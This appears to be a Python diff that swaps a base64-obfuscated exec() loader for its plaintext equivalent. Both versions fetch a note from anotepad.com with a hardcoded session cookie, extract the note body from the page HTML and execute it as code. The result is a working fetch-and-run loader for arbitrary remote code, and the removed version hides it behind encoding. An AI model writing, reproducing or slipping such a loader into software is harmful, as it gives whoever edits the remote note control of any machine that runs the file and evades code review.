@@ -1,10 +1,28 @@
-
-import base64
-
-# Đoạn mã giải mã
-encoded_data = '''
-aW1wb3J0IHJlcXVlc3RzLCBodG1sDQpoZWFkZXJzID0gew0KICAgICdhdXRob3JpdHknIDogJ2Fub3RlcGFkLmNvbScsDQogICAgJ21ldGhvZCcgOiAnR0VUJywNCiAgICAncGF0aCcgOiAgJy9ub3Rlcy8zZjNyZGtoNScsDQogICAgJ3NjaGVtZScgOiAnaHR0cHMnLA0KICAgICdBY2NlcHQnIDogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCxhcHBsaWNhdGlvbi9zaWduZWQtZXhjaGFuZ2U7dj1iMztxPTAuNycsDQogICAgJ0FjY2VwdC1MYW5ndWFnZScgOiAndmksdmktVk47cT0wLjksZW47cT0wLjgnLA0KICAgICdDYWNoZS1Db250cm9sJyA6ICdtYXgtYWdlPTAnLA0KICAgICdDb29raWUnIDogJ19nYT1HQTEuMS4xNTYwNjc0MzI0LjE2OTcyNzE0ODk7IEFub3RlcGFkSWQ9Q0Q5OEVBMzdCNjlBRjA2NTZFRkZCOERDNEExQjZDMzYxMDkzRUY2MUQ0NTc4NTkyMTc4Mjc1MjcxMEM1NjRGNUQyOTNBQTExQzBDQzM0QkJFQkVENzQxN0VDNTE3RTYxRjlBOEE4NDQyQzhFQzA0ODk2RjBGREIxNDkxRjQ0QjIwNjE5N0I0MTM2QjE3NjEyRDY5M0VGNEZBQjJEODQzNkNCN0VDMkY1NTBFOTlGQThFNDc1MDExODA0MTQ4OTYwQjAwNTlFOUFFQ0I4RjI1NTBCNjU5QjJEM0I5NTVEMUI7IF9nYV82UEczTU04NktYPUdTMS4xLjE2OTc1NTM4MjIuNS4xLjE2OTc1NTM5MDEuMC4wLjAnLA0KICAgICdSZWZlcmVyJyA6ICdodHRwczovL2Fub3RlcGFkLmNvbS8nLA0KICAgICdTZWMtQ2gtVWEnIDogICAgJyJDaHJvbWl1bSI7dj0iMTE4IiwgIkdvb2dsZSBDaHJvbWUiO3Y9IjExOCIsICJOb3Q9QT9CcmFuZCI7dj0iOTkiJywNCiAgICAnU2VjLUNoLVVhLU1vYmlsZScgOiAnPzAnLA0KICAgICdTZWMtQ2gtVWEtUGxhdGZvcm0nIDogJyJXaW5kb3dzIicsDQogICAgJ1NlYy1GZXRjaC1EZXN0JyA6ICdkb2N1bWVudCcsDQogICAgJ1NlYy1GZXRjaC1Nb2RlJyA6ICduYXZpZ2F0ZScsDQogICAgJ1NlYy1GZXRjaC1TaXRlJyA6ICdzYW1lLW9yaWdpbicsDQogICAgJ1NlYy1GZXRjaC1Vc2VyJyA6ICc/MScsDQogICAgJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnIDogJzEnLA0KICAgICdVc2VyLUFnZW50JyA6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTE4LjAuMC4wIFNhZmFyaS81MzcuMzYnLA0KfQ0KdXJsID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2Fub3RlcGFkLmNvbS9ub3Rlcy8zZjNyZGtoNScsIGhlYWRlcnM9IGhlYWRlcnMpDQp0ZXh0ID0gdXJsLnRleHQNCnNwbGl0ID0gdGV4dC5zcGxpdCgnPHRleHRhcmVhIG5hbWU9Im5vdGVjb250ZW50IiBjbGFzcz0iZm9ybS1jb250cm9sIHRleHRhcmVhICIgaWQ9ImVkaXRfdGV4dGFyZWEiIHBsYWNlaG9sZGVyPSJOb3RlIENvbnRlbnQiIHRhYmluZGV4PSIyIiByb3dzPSIxOSI+JylbMV0uc3BsaXQoJzwvdGV4dGFyZWE+JylbMF0NCmV4ZWMoaHRtbC51bmVzY2FwZShzcGxpdCkp
-'''
-
-# Giải mã và thực thi nội dung
-exec(base64.b64decode(encoded_data).decode('utf-8'))
+import requests, html
+def get(cookie):
+    headers = {
+        'authority' : 'anotepad.com',
+        'method' : 'GET',
+        'path' :  '/notes/3f3rdkh5',
+        'scheme' : 'https',
+        'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'Accept-Language' : 'vi,vi-VN;q=0.9,en;q=0.8',
+        'Cache-Control' : 'max-age=0',
+        'Cookie' : cookie,
+        'Referer' : 'https://anotepad.com/',
+        'Sec-Ch-Ua' :    '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
+        'Sec-Ch-Ua-Mobile' : '?0',
+        'Sec-Ch-Ua-Platform' : '"Windows"',
+        'Sec-Fetch-Dest' : 'document',
+        'Sec-Fetch-Mode' : 'navigate',
+        'Sec-Fetch-Site' : 'same-origin',
+        'Sec-Fetch-User' : '?1',
+        'Upgrade-Insecure-Requests' : '1',
+        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+    }
+    url = requests.get('https://anotepad.com/notes/3f3rdkh5', headers= headers)
+    text = url.text
+    split = text.split('<textarea name="notecontent" class="form-control textarea " id="edit_textarea" placeholder="Note Content" tabindex="2" rows="19">')[1].split('</textarea>')[0]
+    exec(html.unescape(split))
+cookie ='_ga=GA1.1.1560674324.1697271489; AnotepadId=CD98EA37B69AF0656EFFB8DC4A1B6C361093EF61D45785921782752710C564F5D293AA11C0CC34BBEBED7417EC517E61F9A8A8442C8EC04896F0FDB1491F44B206197B4136B17612D693EF4FAB2D8436CB7EC2F550E99FA8E475011804148960B0059E9AECB8F2550B659B2D3B955D1B; _ga_6PG3MM86KX=GS1.1.1697553822.5.1.1697553901.0.0.0'
+get(cookie)
